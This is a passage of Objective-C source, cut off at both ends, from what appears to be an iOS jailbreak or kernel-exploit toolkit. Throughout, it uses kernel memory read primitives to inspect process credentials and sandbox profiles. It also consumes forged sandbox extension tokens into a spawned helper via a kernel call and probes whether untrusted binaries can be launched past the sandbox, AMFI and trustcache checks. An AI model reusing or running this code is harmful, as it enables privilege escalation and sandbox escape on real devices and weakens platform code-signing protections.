            if (rn == (ssize_t)sizeof(mach_magic)) {
                dt1025_log(log, @"[*] build102.6.31 KCALL631_TARGET_PREFLIGHT mach_magic=0x%08x",
                    mach_magic);
                if (mach_magic != 0xFEEDFACF && mach_magic != 0xCFFAEDFE) {
                    dt1025_log(log, @"[!] build102.6.31 KCALL631_TARGET_PREFLIGHT fail bad mach magic");
                    return -1;
                }
            }
        }

        cdhash_t hash;
        memset(hash, 0, sizeof(hash));
        int hash_err = dt_macho_best_cdhash_from_path(path, hash);
        BOOL trusted = (hash_err == 0) ? dt_cdhash_trustcached(hash) : NO;
        dt1025_log(log, @"[*] build102.6.31 KCALL631_TARGET_PREFLIGHT cdhash_err=%d trusted=%d",
            hash_err, trusted ? 1 : 0);
        if (hash_err != 0 || !trusted) {
            dt1025_log(log, @"[!] build102.6.31 KCALL631_TARGET_PREFLIGHT fail probe not signed/trusted — run G2 sign stage");
            return -1;
        }

        if (selected_out)
            *selected_out = path;
        return 0;
    }
    return -1;
}

static BOOL dt1025_scan_contains(NSString *haystack, NSString *needle)
{
    return haystack.length && needle.length &&
        [haystack rangeOfString:needle].location != NSNotFound;
}

static void dt1025_run_634_classify_spawn(pid_t broker_pid, NSString *brokerOut,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    NSString *logPath = [DTRunLogger logFilePath];
    NSString *logText = [NSString stringWithContentsOfFile:logPath encoding:NSUTF8StringEncoding error:nil] ?: @"";
    NSString *scan = [NSString stringWithFormat:@"%@\n%@", brokerOut ?: @"", logText];

    int broker_spawn_pid = dt1025_run_630_parse_int_field(brokerOut, @"broker_spawn_pid", -1);
    if (broker_spawn_pid > 0 && broker_spawn_pid != (int)broker_pid) {
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_SPAWN_WRONG_PROC");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_SPAWN_WRONG_PROC");
        dt1025_log(log, @"[!] build102.6.34 broker_spawn_pid=%d != broker_pid=%d",
            broker_spawn_pid, (int)broker_pid);
        return;
    }

    if ([brokerOut rangeOfString:@"KCALL630_PHASE3_FAIL_SCOPE_VIOLATION"].location != NSNotFound) {
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_SCOPE_VIOLATION");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_SCOPE_VIOLATION");
        return;
    }

    BOOL wall_a = dt1025_scan_contains(scan, @"only launchd is allowed to spawn untrusted binaries");
    BOOL op129 = dt1025_scan_contains(scan, @"process-exec denied while updating label") ||
        dt1025_scan_contains(scan, @"failed to apply exec policy");
    BOOL post_op129 = dt1025_scan_contains(scan, @"attempting to use a container without a code signing identity") ||
        dt1025_scan_contains(scan, @"outside of container && not a driver") ||
        dt1025_scan_contains(scan, @"failed to set executable path");
    BOOL amfi = dt1025_scan_contains(scan, @"AMFI: hook..execve() killing") ||
        dt1025_scan_contains(scan, @"Library Validation") ||
        (dt1025_scan_contains(scan, @"code signature") && dt1025_scan_contains(scan, @"AMFI"));

    int spawn_ret = dt1025_run_630_parse_int_field(brokerOut, @"spawn_ret", -1);
    int spawn_errno = dt1025_run_630_parse_int_field(brokerOut, @"spawn_errno", 0);
    int child_pid = dt1025_run_630_parse_int_field(brokerOut, @"child_pid", 0);
    int child_exit = dt1025_run_630_parse_int_field(brokerOut, @"child_exit", -1);
    int waitpid_ok = dt1025_run_630_parse_int_field(brokerOut, @"waitpid_ok", 0);

    dt1025_log(log, @"[*] build102.6.34 spawn classify broker_spawn_pid=%d spawn_ret=%d errno=%d child_pid=%d child_exit=%d waitpid_ok=%d wall_a=%d op129=%d post_op129=%d amfi=%d",
        broker_spawn_pid, spawn_ret, spawn_errno, child_pid, child_exit, waitpid_ok,
        wall_a ? 1 : 0, op129 ? 1 : 0, post_op129 ? 1 : 0, amfi ? 1 : 0);

    if (wall_a) {
        dt1025_stage(@"KCALL634_PHASE3_WALLA_CONFIRMED");
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_WALL_A_DENY");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_WALL_A_DENY");
        return;
    }
    if (op129) {
        dt1025_stage(@"KCALL634_PHASE3_OP129_REACHED");
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_OP129_DENY");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_OP129_DENY");
        return;
    }
    if (post_op129) {
        dt1025_stage(@"KCALL634_PHASE3_EXEC_POST_OP129_DENY");
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL_UNCLASSIFIED");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_PROBE_FAIL_UNCLASSIFIED");
        dt1025_log(log, @"[!] build102.6.34 post-op129/container exec deny substring in capture");
        return;
    }
    if (amfi) {
        dt1025_stage(@"KCALL634_PHASE3_AMFI_EXEC_DENY");
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL_UNCLASSIFIED");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_PROBE_FAIL_UNCLASSIFIED");
        dt1025_log(log, @"[!] build102.6.34 AMFI exec deny substring in capture");
        return;
    }

    if (spawn_ret == 0 && child_pid > 0 && waitpid_ok == 1 && child_exit == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_SUCCESS");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_PROBE_SUCCESS");
        return;
    }

    if (spawn_ret != 0 && spawn_errno == EPERM) {
        dt1025_stage(@"KCALL634_PHASE3_SPAWN_EPERM_UNCLASSIFIED");
        dt1025_log(log, @"[!] build102.6.34 spawn EPERM — capture Console ±2s around KCALL634_PHASE3_KERNEL_LOG_WINDOW_BEGIN/END");
    }

    dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL_UNCLASSIFIED");
    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_PROBE_FAIL_UNCLASSIFIED");
    dt1025_log(log, @"[!] build102.6.34 spawn failed without classifying kernel deny substring — widen Console capture around kernel log window markers");
}

static void dt1025_run_630_classify_spawn(pid_t broker_pid, NSString *brokerOut,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_run_634_classify_spawn(broker_pid, brokerOut, log, verdictOut);
}

static int dt1025_run_630_phase3_broker_spawn_probe(pid_t app_pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    pid_t broker_pid = -1;
    uint64_t broker_proc_kptr = 0;
    int stdout_rd = -1;
    int cmd_wr = -1;
    const char *phase2_class = kDTClassExec;
    const char *phase2_path = kDT629Phase2JbPath;
    const char *spawn_target = NULL;
    uint64_t phase3_profile_ptr = 0;
    int64_t phase3_handle_out = 0;
    dt1025_plus8_mirror_snap_t phase3_mirror_post = { 0 };
    NSString *phase3_profile_name = nil;

    dt1025_log(log, @"[*] build102.6.30 KCALL630_PHASE3_BROKER_SPAWN_PROBE begin app_pid=%d",
        (int)app_pid);
    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_BROKER_SPAWN_PROBE");
    dt1025_stage(@"build102.6.30 KCALL630_SAME_SESSION_HOLDSPAWN_PIPE_TRIGGER");
    dt1025_stage(@"KCALL633_PHASE3_HOLDSPAWN_CMD_PIPE_FD_FIX");
    dt1025_stage(@"KCALL634_PHASE3_EPERM_BRANCH_TELEMETRY");
    dt1025_stage(@"build102.6.21 KCALL619_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if (!dt1025_helper_entitlements_ok(log)) {
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_IDENTITY_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -10;
    }
    dt1025_stage(@"KCALL634_PHASE3_WALLA_SKIPPED");

    NSString *helperPath = [DTRootHelperClient helperBundledPath];
    if (!helperPath.length || ![[NSFileManager defaultManager] isExecutableFileAtPath:helperPath]) {
        dt1025_log(log, @"[!] build102.6.30 bundled bootstraphelper missing at %@", helperPath ?: @"?");
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_IDENTITY_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -11;
    }

    dt1025_log(log, @"[*] build102.6.30 spawn bundled bootstraphelper holdSpawn path=%@", helperPath);
    dt1025_stage(@"build102.6.30 KCALL630_BUNDLED_HOLDSPAWN_ONLY");

    NSString *stdoutCapture = nil;
    NSError *spawnErr = nil;
    int spawn_r = dt_spawn_hold_probe_start(helperPath, &broker_pid, &stdout_rd, &cmd_wr,
        &stdoutCapture, &spawnErr);
    if (spawn_r != 0 || broker_pid <= 0 || stdout_rd < 0 || cmd_wr < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_IDENTITY_PREREQ");
        if (stdout_rd >= 0) close(stdout_rd);
        if (cmd_wr >= 0) close(cmd_wr);
        dt1025_run_630_phase3_scope_finish(log);
        return -13;
    }

    dt1025_log(log, @"[*] build102.6.30 holdSpawn ok broker_pid=%d stdout=%@",
        (int)broker_pid, stdoutCapture ?: @"");

    if ([stdoutCapture rangeOfString:@"hold_spawn_cmd_fd_ok=1"].location == NSNotFound) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL633_PHASE3_FAIL_CMD_FD_INVALID");
        dt1025_stage(@"KCALL633_PHASE3_FAIL_CMD_FD_INVALID");
        dt1025_log(log, @"[!] build102.6.33 holdSpawn cmd fd preflight missing or invalid stdout=%@",
            stdoutCapture ?: @"");
        dt1025_run_630_phase3_scope_finish(log);
        return -12;
    }

    dt1025_stage(@"KCALL633_PHASE3_CMD_FD_PREFLIGHT_OK");
    dt1025_log(log, @"[+] build102.6.33 holdSpawn cmd fd preflight OK broker_pid=%d", (int)broker_pid);

    if (kill(broker_pid, 0) != 0) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_BROKER_DIED");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_BROKER_DIED");
        dt1025_run_630_phase3_scope_finish(log);
        return -14;
    }

    int broker_ppid = dt1025_userspace_ppid(broker_pid);
    if (broker_ppid != (int)app_pid) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_IDENTITY_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -15;
    }

    int resolve_attempts = 0;
    int resolve_alive_fail = 0;
    broker_proc_kptr = dt1025_broker_proc_resolve(app_pid, broker_pid, log,
        &resolve_attempts, &resolve_alive_fail);
    if (!broker_proc_kptr) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_IDENTITY_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -17;
    }

    uint64_t ucred_kptr = proc_ucred(broker_proc_kptr);
    uint64_t label_kptr = ucred_kptr ? kread_ptr(ucred_kptr + kDTUcredLabelOff) : 0;
    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    uint64_t profile_resolved = label_kptr ? mac_label_get(label_kptr, (int)configured_slot) : 0;

    NSString *profile_name = profile_resolved ? dt1025_resolve_profile_name(profile_resolved, log) : nil;
    if (!profile_name || ![profile_name isEqualToString:@"container"]) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, broker_proc_kptr, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_IDENTITY_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -21;
    }

    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_BROKER_IDENTITY_PREREQ_OK");
    dt1025_log(log, @"[+] build102.6.30 Phase 1 identity precheck PASS broker_pid=%d profile_name=container",
        (int)broker_pid);

    dt1025_plus8_mirror_snap_t mirror_pre = { 0 };
    dt1025_plus8_mirror_snap_t mirror_post = { 0 };
    dt1025_plus8_mirror_read(profile_resolved, phase2_class, &mirror_pre, log, "baseline_pre", NO, NULL);

    char *token = dt1025_issue_token_path(phase2_class, phase2_path, log);
    if (!token) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, broker_proc_kptr, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_ATTACH_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -30;
    }

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(broker_proc_kptr, token, log, &consume_kern_ret);
    free(token);

    if (consume_kern_ret != 0 || handle_out <= 0) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, broker_proc_kptr, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_ATTACH_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -31;
    }

    dt1025_plus8_mirror_read(profile_resolved, phase2_class, &mirror_post, log, "mirror_post", YES, phase2_path);

    phase3_profile_ptr = profile_resolved;
    phase3_mirror_post = mirror_post;
    phase3_handle_out = handle_out;
    phase3_profile_name = [profile_name copy];

    BOOL s1 = mirror_pre.ext_container == 0 && mirror_post.ext_container != 0;
    BOOL s2 = mirror_pre.bucket_head != mirror_post.bucket_head;
    BOOL s3 = !mirror_pre.class_bucket_present && mirror_post.class_bucket_present;
    BOOL s4 = mirror_post.rec_attached == 1;
    BOOL s5 = mirror_post.handle_count > mirror_pre.handle_count;
    BOOL any_delta = s1 || s2 || s3 || s4 || s5;

    if (!any_delta) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, broker_proc_kptr, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_SPAWN_PROBE_FAIL");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_ATTACH_PREREQ");
        dt1025_run_630_phase3_scope_finish(log);
        return -33;
    }

    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_EXTENSION_ATTACH_PREREQ_OK");
    dt1025_log(log, @"[+] build102.6.30 Phase 2 attach precheck PASS handle_out=%lld broker_pid=%d",
        (long long)handle_out, (int)broker_pid);

    proc_rele(broker_proc_kptr);
    broker_proc_kptr = 0;

    if (kill(broker_pid, 0) != 0) {
        close(cmd_wr);
        close(stdout_rd);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_BROKER_DIED");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_BROKER_DIED");
        dt1025_run_630_phase3_scope_finish(log);
        return -40;
    }

    dt1025_stage(@"build102.6.31 KCALL631_PHASE3_TARGET_SELECTION_FIX_ACTIVE");
    if (dt1025_run_631_target_enum(log) != 0) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_TARGET_MISSING");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_TARGET_MISSING");
        dt1025_run_630_phase3_scope_finish(log);
        return -41;
    }

    if (dt1025_run_630_target_preflight(log, &spawn_target) != 0 || !spawn_target) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_TARGET_MISSING");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_TARGET_MISSING");
        dt1025_run_630_phase3_scope_finish(log);
        return -41;
    }

    dt1025_stage(@"build102.6.31 KCALL631_PHASE3_TARGET_PREFLIGHT_OK");
    dt1025_log(log, @"[*] build102.6.31 spawn target selected path=%s (KFD app will NOT spawn this path)",
        spawn_target);

    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_ATTEMPT_OK");
    dt1025_log(log, @"[*] build102.6.34 pre-spawn telemetry app_pid=%d broker_pid=%d target=%s",
        (int)app_pid, (int)broker_pid, spawn_target);
    dt1025_log(log, @"[*] build102.6.34 pre-spawn broker_profile_name=%@ profile_ptr=0x%llx profile+8=0x%llx",
        phase3_profile_name ?: @"?",
        (unsigned long long)phase3_profile_ptr,
        (unsigned long long)phase3_mirror_post.ext_container);
    dt1025_log(log, @"[*] build102.6.34 pre-spawn phase2_class=%s phase2_path=%s handle_out=%lld rec_path=%s",
        phase2_class, phase2_path, (long long)phase3_handle_out,
        phase3_mirror_post.rec_path_buf[0] ? phase3_mirror_post.rec_path_buf : "?");
    dt1025_log(log, @"[*] build102.6.34 pre-spawn platform_entitlement_preflight=1");
    dt1025_stage(@"KCALL634_PHASE3_OP129_REACHED");
    dt1025_log(log, @"[*] build102.6.30 same-session pipe trigger broker_pid=%d target=%s",
        (int)broker_pid, spawn_target);

    char cmdline[PATH_MAX + 16];
    snprintf(cmdline, sizeof(cmdline), "SPAWN %s\n", spawn_target);
    size_t cmd_len = strlen(cmdline);
    dt1025_log(log, @"[*] build102.6.33 pipe write cmd=%s len=%zu", @(cmdline), cmd_len);
    void (*old_pipe)(int) = signal(SIGPIPE, SIG_IGN);
    ssize_t wn = write(cmd_wr, cmdline, cmd_len);
    int write_errno = (wn < 0) ? errno : 0;
    if (old_pipe != SIG_ERR)
        signal(SIGPIPE, old_pipe);
    dt1025_log(log, @"[*] build102.6.33 pipe write ret=%zd", wn);
    if (wn < 0) {
        dt1025_log(log, @"[!] build102.6.33 pipe write errno=%d", write_errno);
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        if (write_errno == EPIPE) {
            dt1025_set_verdict(verdictOut, @"KCALL633_PHASE3_FAIL_CMD_PIPE_EPIPE");
            dt1025_stage(@"KCALL633_PHASE3_FAIL_CMD_PIPE_EPIPE");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_ATTACH_THEN_SPAWN_SESSION");
            dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_ATTACH_THEN_SPAWN_SESSION");
        }
        dt1025_run_630_phase3_scope_finish(log);
        return -42;
    }

    NSString *brokerSpawnOut = dt1025_run_630_read_broker_out(stdout_rd,
        "KCALL630_PHASE3_SPAWN_PROBE_DONE", 30000);
    dt1025_log(log, @"[*] build102.6.30 broker spawn output:\n%@", brokerSpawnOut ?: @"");

    if ([brokerSpawnOut rangeOfString:@"KCALL630_PHASE3_SPAWN_PROBE_DONE"].location == NSNotFound) {
        dt1025_run_630_phase3_fail_cleanup(broker_pid, 0, stdout_rd, cmd_wr, log);
        dt1025_set_verdict(verdictOut, @"KCALL630_PHASE3_FAIL_ATTACH_THEN_SPAWN_SESSION");
        dt1025_stage(@"build102.6.30 KCALL630_PHASE3_FAIL_ATTACH_THEN_SPAWN_SESSION");
        dt1025_run_630_phase3_scope_finish(log);
        return -43;
    }

    dt1025_run_630_classify_spawn(broker_pid, brokerSpawnOut, log, verdictOut);

    close(cmd_wr);
    close(stdout_rd);
    dt1025_stop_helper(broker_pid, log);

    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_DEVICE_RUN_COMPLETE");
    dt1025_run_630_phase3_scope_finish(log);
    return 0;
}

static void dt1025_run_616_finish(void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    (void)log;
    (void)verdictOut;
    dt1025_stage(@"build102.6.16 KCALL616_NO_MMAP_NO_AMFI_LANE");
    dt1025_stage(@"build102.6.16 KCALL616_NO_CONSUME_CHAIN");
    dt1025_stage(@"build102.6.16 KCALL616_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.16 KCALL616_DEVICE_RUN_COMPLETE");
}

static int dt1025_run_616_path_preflight(const char *path, const char *tag, BOOL log_path_len,
    void (^log)(NSString *line), uint32_t *mach_magic_out, int64_t *size_out)
{
    if (!path || !path[0])
        return -1;

    if (log_path_len) {
        size_t path_len = strlen(path);
        dt1025_log(log, @"[*] build102.6.16 KCALL616_%s_PREFLIGHT path=%s path_len=%zu",
            tag, path, path_len);
    } else {
        dt1025_log(log, @"[*] build102.6.16 KCALL616_%s_PREFLIGHT path=%s",
            tag, path);
    }

    struct stat st = { 0 };
    errno = 0;
    int stat_ret = stat(path, &st);
    int stat_errno = errno;

    dt1025_log(log, @"[*] build102.6.16 KCALL616_%s_PREFLIGHT stat ret=%d size=%lld errno=%d",
        tag, stat_ret, (long long)st.st_size, stat_errno);

    if (stat_ret != 0)
        return -10;

    errno = 0;
    int fd = open(path, O_RDONLY);
    int open_errno = errno;

    dt1025_log(log, @"[*] build102.6.16 KCALL616_%s_PREFLIGHT open fd=%d errno=%d",
        tag, fd, open_errno);

    if (fd < 0)
        return -11;

    unsigned char magic_buf[kDT616MachMagicBytes];
    memset(magic_buf, 0, sizeof(magic_buf));
    errno = 0;
    ssize_t magic_ret = read(fd, magic_buf, kDT616MachMagicBytes);
    int magic_errno = errno;
    close(fd);

    if (magic_ret != (ssize_t)kDT616MachMagicBytes) {
        dt1025_log(log, @"[*] build102.6.16 KCALL616_%s_PREFLIGHT magic read_ret=%zd errno=%d",
            tag, magic_ret, magic_errno);
        return -12;
    }

    uint32_t mach_magic = 0;
    memcpy(&mach_magic, magic_buf, sizeof(mach_magic));
    dt1025_log(log, @"[*] build102.6.16 KCALL616_%s_PREFLIGHT magic mach_magic=0x%08x size=%lld errno=0",
        tag, mach_magic, (long long)st.st_size);

    if (mach_magic_out)
        *mach_magic_out = mach_magic;
    if (size_out)
        *size_out = (int64_t)st.st_size;
    return 0;
}

static int dt1025_run_616_seatbelt_op16_dual_path_compare(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.16 KCALL616_SEATBELT_OP16_DUAL_PATH_COMPARE begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.16 KCALL616_SEATBELT_OP16_DUAL_PATH_COMPARE");
    dt1025_stage(@"build102.6.16 KCALL616_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL616_SELF_TARGET_FAIL");
        dt1025_run_616_finish(log, verdictOut);
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL616_SELF_TARGET_FAIL");
        dt1025_run_616_finish(log, verdictOut);
        return -11;
    }

    char self_path_buf[PATH_MAX];
    const char *self_path = dt1025_resolve_self_executable_path(self_path_buf, sizeof(self_path_buf), log);
    if (!self_path) {
        dt1025_set_verdict(verdictOut, @"KCALL616_SELF_PATH_RESOLVE_FAIL");
        dt1025_run_616_finish(log, verdictOut);
        return -20;
    }

    uint32_t self_magic = 0;
    int64_t self_size = 0;
    if (dt1025_run_616_path_preflight(self_path, "SELF", YES, log, &self_magic, &self_size) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL616_SELF_PATH_PREFLIGHT_FAIL");
        dt1025_run_616_finish(log, verdictOut);
        return -21;
    }
    dt1025_stage(@"build102.6.16 KCALL616_SELF_PATH_PREFLIGHT_OK");

    uint32_t jb_magic = 0;
    int64_t jb_size = 0;
    if (dt1025_run_616_path_preflight(kDT616JbrootPath, "JBROOT", NO, log, &jb_magic, &jb_size) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL616_JBROOT_PATH_PREFLIGHT_FAIL");
        dt1025_run_616_finish(log, verdictOut);
        return -22;
    }
    dt1025_stage(@"build102.6.16 KCALL616_JBROOT_PATH_PREFLIGHT_OK");

    dt1025_stage(@"build102.6.16 KCALL616_SELF_SANDBOX_CHECK_BEGIN");
    dt1025_log(log, @"[*] build102.6.16 KCALL616_SELF_SANDBOX_CHECK op=%s flags=0x%x path=%s",
        kDT614SandboxOp, kDT614SandboxCheckFlags, self_path);

    int self_errno = 0;
    int self_ret = dt1025_sandbox_check_op16(self_path, &self_errno, log);
    dt1025_log(log, @"[*] build102.6.16 KCALL616_SELF_SANDBOX_CHECK_RESULT ret=%d errno=%d path_len=%zu size=%lld magic=0x%08x",
        self_ret, self_errno, strlen(self_path), (long long)self_size, self_magic);

    if (self_ret < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL616_SELF_SANDBOX_CHECK_BAD_ARGS");
        dt1025_stage(@"build102.6.16 KCALL616_PATH_CLASS_SPLIT_UNEXPECTED");
        dt1025_run_616_finish(log, verdictOut);
        return -30;
    }

    BOOL self_allow = (self_ret == 0);
    if (self_allow) {
        dt1025_stage(@"build102.6.16 KCALL616_SELF_SANDBOX_CHECK_ALLOW");
    } else {
        dt1025_stage(@"build102.6.16 KCALL616_SELF_SANDBOX_CHECK_DENY");
    }

    dt1025_stage(@"build102.6.16 KCALL616_JBROOT_SANDBOX_CHECK_BEGIN");
    dt1025_log(log, @"[*] build102.6.16 KCALL616_JBROOT_SANDBOX_CHECK op=%s flags=0x%x path=%s",
        kDT614SandboxOp, kDT614SandboxCheckFlags, kDT616JbrootPath);

    int jb_errno = 0;
    int jb_ret = dt1025_sandbox_check_op16(kDT616JbrootPath, &jb_errno, log);
    dt1025_log(log, @"[*] build102.6.16 KCALL616_JBROOT_SANDBOX_CHECK_RESULT ret=%d errno=%d size=%lld magic=0x%08x",
        jb_ret, jb_errno, (long long)jb_size, jb_magic);

    if (jb_ret < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL616_JBROOT_SANDBOX_CHECK_BAD_ARGS");
        dt1025_stage(@"build102.6.16 KCALL616_PATH_CLASS_SPLIT_UNEXPECTED");
        dt1025_run_616_finish(log, verdictOut);
        return -31;
    }

    BOOL jb_allow = (jb_ret == 0);
    if (jb_allow) {
        dt1025_stage(@"build102.6.16 KCALL616_JBROOT_SANDBOX_CHECK_ALLOW");
    } else {
        dt1025_stage(@"build102.6.16 KCALL616_JBROOT_SANDBOX_CHECK_DENY");
    }

    if (self_allow && !jb_allow) {
        dt1025_set_verdict(verdictOut, @"KCALL616_PATH_CLASS_SPLIT_CONFIRMED");
        dt1025_stage(@"build102.6.16 KCALL616_PATH_CLASS_SPLIT_CONFIRMED");
    } else {
        dt1025_set_verdict(verdictOut, @"KCALL616_PATH_CLASS_SPLIT_UNEXPECTED");
        dt1025_stage(@"build102.6.16 KCALL616_PATH_CLASS_SPLIT_UNEXPECTED");
    }

    dt1025_run_616_finish(log, verdictOut);
    dt1025_log(log, @"[*] build102.6.16 verdict=%@ order=self_preflight_jb_preflight_self_check_jb_check_compare mmap=NO consume=NO dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static int dt1025_run_consume_smoke(uint64_t proc_kptr, pid_t pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_log(log, @"[*] build102.5.96 KCALL596_G5_ONLY_CONSUME_SMOKE begin proc=0x%llx pid=%d",
        (unsigned long long)proc_kptr, (int)pid);
    dt1025_stage(@"build102.5.96 KCALL596_KCALL_SAFE_PROBE_OK_CONFIRMED");

    dt1025_sandbox_chain_t chain = { 0 };
    int chain_r = dt1025_chain_for_pid(pid, &chain, log);
    if (chain_r != 0) {
        dt1025_log(log, @"[!] build102.5.96 chain log failed r=%d", chain_r);
        dt1025_set_verdict(verdictOut, @"KCALL596_CHAIN_LOG_FAIL");
        dt1025_stage(@"build102.5.96 KCALL596_CHAIN_LOG_FAIL");
        return -5;
    }

    dt1025_log_chain("app", pid, &chain, log);
    dt1025_stage(@"build102.5.96 KCALL596_CHAIN_LOG_OK");

    char *token = dt1025_issue_token(kDTClassRead, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL596_ISSUE_TOKEN_FAIL");
        dt1025_stage(@"build102.5.96 KCALL596_ISSUE_TOKEN_FAIL");
        return -6;
    }

    int kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &kern_ret);
    dt1025_log(log, @"[*] build102.5.96 consume smoke class=%s kern_ret=%d handle_out=%lld slot0=0x%llx",
        kDTClassRead, kern_ret, (long long)handle_out, (unsigned long long)chain.slot0_profile);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL596_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.5.96 KCALL596_CONSUME_DISPATCH_FAIL");
        return -7;
    }

    if (kern_ret != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL596_CONSUME_KERN_FAIL");
        dt1025_stage(@"build102.5.96 KCALL596_CONSUME_KERN_FAIL");
